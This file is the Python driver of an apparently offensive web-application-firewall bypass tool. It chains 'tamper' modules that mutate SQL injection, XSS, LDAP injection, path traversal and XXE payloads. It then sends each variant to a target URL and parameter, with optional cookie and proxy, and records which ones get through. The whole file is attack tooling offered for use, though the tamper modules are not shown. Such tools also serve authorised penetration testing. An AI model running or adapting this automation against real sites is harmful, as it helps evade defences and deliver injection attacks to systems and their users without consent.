# -*- coding: utf-8 -*
# for python 2.7


import os
import sys
import re
import inspect
import argparse
import copy
from main_modules.settings import PRIORITY, TYPE, STDPARAMS, BNSpecifiedTechink
from main_modules.bypass_tester import *
#
mycwd=os.getcwd()




def use_bypass(technik,string):
        have_a_dir(str(directory)+'/'+str(technik))
        files = os.listdir(str(directory)+'/'+str(technik))
        mutation_array=[['','',string]]

        if specifiedattacktechnik:

            result = mutation(files,mutation_array,technik,specifiedattacktechnik,1)
            if result[-1][2]==string:
                print ("I can't find module for "+specifiedattacktechnik)
                print("Stop")
                sys.exit()
            mutation_array=result   
        # universal 
        myprint ("Stage 2 use: universal techniks",1)

        result = mutation(files,mutation_array,technik,'',2)
        mutation_array=mutation_array+result
        # BE specified
        myprint ("Start test Back End specified techicks",1)
        result = mutation(files,mutation_array,technik,'',3)
        mutation_array=result
        
        #Result of work
        for el in mutation_array:
            print ('Mutation algoritm:'+str(el[0]))
            print (el[2])
            if outputfile:
                write_to_file('Mutation algoritm:'+str(el[0]),outputfile+'.full')
                write_to_file('Result: '+str(el[2]),outputfile+'.full')
                write_to_file(el[2],outputfile)

def have_a_dir(dir):
    try:
        files = open(str(dir)+'/__init__.py')
    except Exception:
        print(u'Dir '+mycwd+'/'+str(dir)+' or __init__.py not found')
        sys.exit()
    else:
        files.close

def mutation(files,mutation_array,technik,classification,step=2):
    if step!=3:
        new_mutation_array=[]+mutation_array
    else:
        new_mutation_array=[]

    for filename in files:
        if filename!='__init__.py' and re.search(r'.pyc',filename) is None and os.path.isfile(str(directory)+'/'+str(technik)+'/'+filename):
            module_name=filename[:-3]
            try:
                importet_module=__import__(directory+'.'+technik+'.'+module_name)
            except Exception:
                print(u'Import '+module_name+' error')
                sys.exit()
            else:
                # нужно посчитать на сколько уровней ниже основного модуля находится наше правило, и столько раз вызвать getattr(для автоматизации на будущее)
                obj=getattr(importet_module,technik)
                obj=getattr(obj,module_name)
                priority = PRIORITY.NORMAL if not hasattr(obj, "__priority__") else obj.__priority__
                classification_type = TYPE.BackEND_SPECIFIED if not hasattr(obj,"__classificationtype__") else obj.__classificationtype__
                specified_name = 'NONE' if not hasattr(obj,"__specified_name__") else obj.__specified_name__
                # Если пользователь задал использование специфичной атаки(пример imagetrgik)
                if classification and step==1:
                    regex=re.escape(classification)
                    if re.search(regex,specified_name,flags=re.IGNORECASE) is not None:
                        result=obj.tamper(mutation_array[0][2])   
                        new_mutation_array.append([module_name,priority,result])
                        if result==mutation_array[0][2]:
                            print("Module "+module_name+" cant modificate your atack")
                            print("Stop")
                            sys.exit()
                        return new_mutation_array
                    else:
                        continue
                i=0
                for new_el in mutation_array:
                    if step==3:

                        if classification_type == TYPE.BackEND_SPECIFIED:
                            result=obj.tamper(new_el[2])
                            if type(result)==list:
                                for r in result:
                                    if re.search(re.escape(new_el[2]),r) is not None:
                                        continue
                                    is_true=bypass_tester(url_for_atack,r,cookie,proxy,False,request_param_for_atack,post)
                                    if is_true==1:
                                        new_mutation_array.insert(i,[module_name+' '+new_el[0],priority,result])
                            else:
                                if re.search(re.escape(new_el[2]),result) is not None:
                                    continue
                                is_true=bypass_tester(url_for_atack,result,cookie,proxy,False,request_param_for_atack,post)
                                if is_true==1:
                                    new_mutation_array.insert(i,[module_name+' '+new_el[0],priority,result])
                for new_el in new_mutation_array:
                    if step==2:
                        if classification_type == TYPE.UNIVERSAL and ((re.search(re.escape(module_name),new_el[0]) is None) or new_el[0]==''):
                                result=obj.tamper(new_el[2])
                                if type(result)==list:
                                    myprint ('----------- more than 1 result --------------',1)
                                    for el in result:
                                        if re.search(re.escape(new_el[2]),el) is None: 
                                            myprint("Method:"+module_name+ ' Priority '+str(priority)+' '+el,1)
                                            new_mutation_array.append([module_name+' '+new_el[0],priority,el])
                                        else:
                                            myprint("Method: "+module_name+" nothing to do",1)
                                elif type(result)==str:
                                    if result!=new_el[2]:
                                        myprint("i:"+str(i)+" Method:"+module_name+  ' Priority '+str(priority)+' '+result,1)
                                        new_mutation_array.insert(i,[module_name+' '+new_el[0],priority,result])
                                        new_mutation_array.remove(new_el)
                                        #write_to_file(result,outputfile)
                                    else:
                                        myprint("Method: "+module_name+" nothing to do " + result,1)
                                else:
                                    myprint("Ahtung "+str(type(result))+"Method:"+module_name,0)
                                    myprint(str(result),0)
                        i+=1
    
    return new_mutation_array

def myprint(string,log_level):
    if log_level==verbose and verbose or log_level==0:
        print(string)


def main():
    global directory, outputfile, specifiedattacktechnik, dbname, type_atack, injection_element, specifiedbackend, url_for_atack, request_param_for_atack, cookie,proxy, post,verbose
    directory='Tampers'
    parser=createParser()
    atack_params=parser.parse_args()
    injection_element  = atack_params.injstring
    type_atack = atack_params.typeofatack
    outputfile = atack_params.outputfile
    dbname = atack_params.dbname
    specifiedattacktechnik=atack_params.specifiedattacktechnik
    specifiedbackend=atack_params.specifiedbackend
    url_for_atack = atack_params.url
    request_param_for_atack = atack_params.param
    cookie=atack_params.cookie
    proxy=False
    proxy=atack_params.proxy
    post=atack_params.post
    verbose=atack_params.V
    if injection_element and type_atack:
        use_bypass(type_atack,injection_element)       
    else:
        print ('No required parameters: -s and -t. Please read help')
        sys.exit()

def createParser ():
    parser = argparse.ArgumentParser()
    parser.add_argument ('-s','--injstring', default='-1', help='string')
    parser.add_argument ('-t','--typeofatack',help='[sqli,xss,ldapi,pathtr,xxe]')
    parser.add_argument ('-o','--outputfile', help='only bypass strings')
    parser.add_argument ('-db','--dbname',help='[sql,mysql,orale]')
    parser.add_argument ('-a','--specifiedattacktechnik', help='specified attack technik(like image tragik)')
    parser.add_argument ('-bf','--specifiedbackend', help='if you know that back end understand base64, double url encode or another techiks')
    parser.add_argument ('-u','--url', help='link to atack this all get param, if has')
    parser.add_argument ('-p','--param', help='Get or Post param name to atack. Separators | ; , ')
    parser.add_argument ('-c','--cookie', help='cookie_name : cookie')
    parser.add_argument ('-V', help='Verbose')
    parser.add_argument ('--proxy',action='store_const',const=True, help='use proxy from settings.py')
    parser.add_argument ('--post', help='post request')
    return parser

def write_to_file(string,filename):
    if filename:
        f = open(filename, 'a')
        f.write(str(string)+'\n')
        f.close()
    else:
        pass

if __name__ == "__main__":      
    main()
